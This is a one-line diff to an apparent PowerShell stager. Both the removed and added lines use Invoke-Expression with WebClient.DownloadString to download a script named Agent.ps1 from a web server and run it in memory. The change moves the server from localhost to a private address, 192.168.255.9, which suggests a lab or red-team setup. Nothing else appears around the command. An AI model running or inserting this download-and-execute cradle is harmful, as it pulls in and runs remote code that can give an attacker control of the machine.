@@ -1,1 +1,1 @@
-Invoke-Expression ((New-Object System.Net.WebClient).DownloadString("http://localhost:8000/Agent.ps1"))
+Invoke-Expression ((New-Object System.Net.WebClient).DownloadString("http://192.168.255.9:8000/Agent.ps1"))
